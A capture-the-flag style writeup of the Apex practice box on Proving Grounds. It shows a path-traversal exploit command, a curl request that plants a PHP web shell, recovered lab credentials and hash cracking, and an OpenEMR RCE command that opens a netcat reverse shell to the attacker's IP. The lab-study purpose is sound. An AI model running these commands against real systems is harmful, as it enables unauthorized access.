---
layout: writeup
title: Apex - Proving Grounds
date: 2024-07-29 13:32:20 +0300
description: A Writeup of the Apex Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi]
---

Here's another writeup for Apex, an Intermediate Proving Grounds box I saw on the [LainKusunagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). I take note that the community has rated this Very Hard. As usual, I get started with an nmap scan (trying nmap Automator this time) and a quick search of the IP address in the URL bar in case there is a web server on port 80. It looks like there is:

![Apex_1.png](/assets/images/Apex/Apex_1.png){: .responsive-image}

Might as well run a directory scan on that as well while I look around. I see a few emails which could be usernames:

![Apex_2.png](/assets/images/Apex/Apex_2.png){: .responsive-image}

I also see `contact@apex.offsec`. I try a contact form, but it returns the error: "The form action property is not set!" I'm not expecting an SQLi point there. It seems most of the website is all on this one page, but after checking the top bar, I see that Scheduler is not shown on the main page, so I click that, and it takes me to a login page: 

![Apex_3.png](/assets/images/Apex/Apex_3.png){: .responsive-image}

Interesting. I wonder if that URL will show up on the directory scan. Time to check for default creds and exploits. I try a few options for default creds, but I can't get them working. At this point I get the nmap scan back and see: 

```
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

So we have mysql and samba to check out as well. I am able to find a samba share called docs and login using a null username, but it only has two PDFs that don't seem to have anything interesting. I find the same docs later here: `http://192.168.216.145/source/Documents/` but I can't upload a file through SMB to try and execute from that URL. I can't get anything with the MySQL db. The directory search also doesn't seem to find anything interesting, so I focus on web app. It would be better if I could find a version because exploit-db returns 37 entries for exploits. I guess I can started with the unauthenticated ones. 

I tried a few, but I couldn't get anything working. The directory scan also found a directory called `/filemanager` which I intially assumed was somehow a part of the same web service, just because it was nestled within all of the other results. I started to think that maybe it was a a second service running on the same port. I tried uploading a shell, but I couldn't get it to upload, even when changing the filetype to phtml or altering the Mime type. So I started searching for exploits for "Responsive FileManager", again not knowing the version. I tried an RCE that I couldn't get working, but I wanted to find a proof that this might be the correct way forward, so I checked out a path traversal exploit, found [here](https://www.exploit-db.com/exploits/49359). I was able to return /etc/passwd which showed this: `white:x:1000:1000::/home/white:/bin/sh`. I know there was a potential username of wwalter for the doctor Walter White, but this would suggest that the user is actually `white`. I might return to the brute force exploit I found for OpenEMR earlier. But I can continue to check out other possible files first. I can get local.txt from this: `python3 49359.py http://192.168.216.145 PHPSESSID=39l4h8u9blbg9l1e5nmghc56e2 /home/white/local.txt`

I find this exploit which supposedly lets me upload a shell using curl: 

But this returns "forbiden" : `curl -s "http://192.168.216.145/filemanager/execute.php?action=create_file" -d "path=cmd.php&path_thumb=../thumbs/.txt&name=1.txt&new_content=%3c%3f%70%68%70%20%65%63%68%6f%20%73%68%65%6c%6c%5f%65%78%65%63%28%24%5f%47%45%54%5b%27%63%27%5d%29%3b%3f%3e” -H “Cookie: PHPSESSID=39l4h8u9blbg9l1e5nmghc56e2"` 

I try to upload the file with php5, php7, phmtl, and pHP extensions, but I get a 'forbiden' response every time. So the file manager path might not be the path to take, but maybe I can still find a config file with a password which could let me authenticate to the web app. I try this for a while, but I can't seem to get anything at all except `/etc/passwd` and the local.txt file. I go through the open source github pages for both [Responsive FileManager](https://github.com/trippo/ResponsiveFilemanager/tree/master), which showed that it's possible extensions are allow-listed rather than deny-listed, meaning I'm unlikely to upload a working shell, and [OpenEMR](https://github.com/openemr/openemr). I can't seem to find any way for get a OpenEMR file through the filemanager RFI exploit. 

At this point I tried a bunch of different things, in particular trying to find any config files or anything with a password. Unfortunately I could not, and gave up to look for a walkthrough. I'm still a little confused about how the exploit is supposed to actually work. I looked up 3 walkthroughs, two ([1](https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/apex/5-80-filemanager-9.13.4), [2](https://al1z4deh.medium.com/proving-grounds-apex-834e61a9fc03)) of which modified the [code](https://www.exploit-db.com/exploits/49359) I was already using, one of which did not. The thing is, they modify the code so that the returned file is pasted into Documents, but the [third walkthrough](https://medium.com/@jserna4510/proving-grounds-apex-walkthrough-c46ff7935294) evidently didn't need to, and in my own experience trying a bunch of different things, some those files did show up there, and I definitely didn't modify the code. I could not replicate, but I am certain. I mention it because it appears the linked walkthrough didn't need to either, though it also suggest the file we needed to find `/var/www/openemr/sites/default/sqlconf.php` would eventually be found through the SMB server, which is not necessarily the case. It's understandable though that author may not have found the directory where the smb server pointed to: `/var/www/html/source/Documents` or the web directory: `http://192.168.216.145/source/Documents/`. I am certain that web directory showed the /etc/passwd file, the local.txt file, and others that I'd used the RFI exploit for, and again, I never modified the exploit. I'm not sure exactly how that happened, but eventually I gave up trying to replicate, even though I do feel the third walkthrough was enough to at least validate my experience on the matter. 

Eventually I used the first two walkthroughs and edited the exploit to point `path=` on line 36 to `path=/Documents`. This allowed me to read the sqlconf.php file...psych no it didn't. 

![Apex_4.png](/assets/images/Apex/Apex_4.png){: .responsive-image}

Even though the file is shown as having a non-zero size, it opens as blank, and it downloads as 0 bytes. But I can get it from the smbserver. 

![Apex_5.png](/assets/images/Apex/Apex_5.png){: .responsive-image}

That openemr:C78maEQUIeQ turn out to be the SQL creds, and from there we can look around. We see databases "information_schema" and "openemr" and use "openemr." There are a lot of tables, but we can zero in on "users" and ultimately "users_secure." We `SELECT * FROM users_secure` and get this:

![Apex_6.png](/assets/images/Apex/Apex_6.png){: .responsive-image}

I use namethathash to determine that this is bcrypt or hashcat mode 3200. And we get a password of "thedoctor." That gives us creds of admin:thedoctor which we can use on one of the many authenticated exploits for the openemr service found earlier on. I go with [this one](https://www.exploit-db.com/exploits/45161). The command looks like this: 
`python2 45161.py http://192.168.216.145/openemr -u admin -p thedoctor -c 'busybox nc 192.168.45.235 80 -e /bin/bash'`

I get a shell for `www-data`. And I try the usual low hanging fruit like checking for SUID binaries and `sudo -l`. I run linpeas and lse.sh, but eventually retry `thedoctor` as the root password. 

![Apex_7.png](/assets/images/Apex/Apex_7.png){: .responsive-image}

And we're done. Lessons learned - this was a tough one to feel good about as far as lessons learned are concerned. I was able to enumerate and find the correct exploit, but I couldn't ultimately get it working the way it was supposed to. I'm not sure how long that would have taken without looking up a writeup. Changing the path to a different internal directory for an attack using the clipboard would not have occurred to me very quickly, and I guess I can take solace in knowing that I was probably better off looking up that step after a few hours rather than spending a ton more time finding nothing. I also needed to use python2 at one point, not python or python3. I usually do try that, but after having spent a few hours I was pretty tired by the end and double checked my syntax using the writeup. All in all, I don't feel great about this one, but I guess that's why we put the time in. 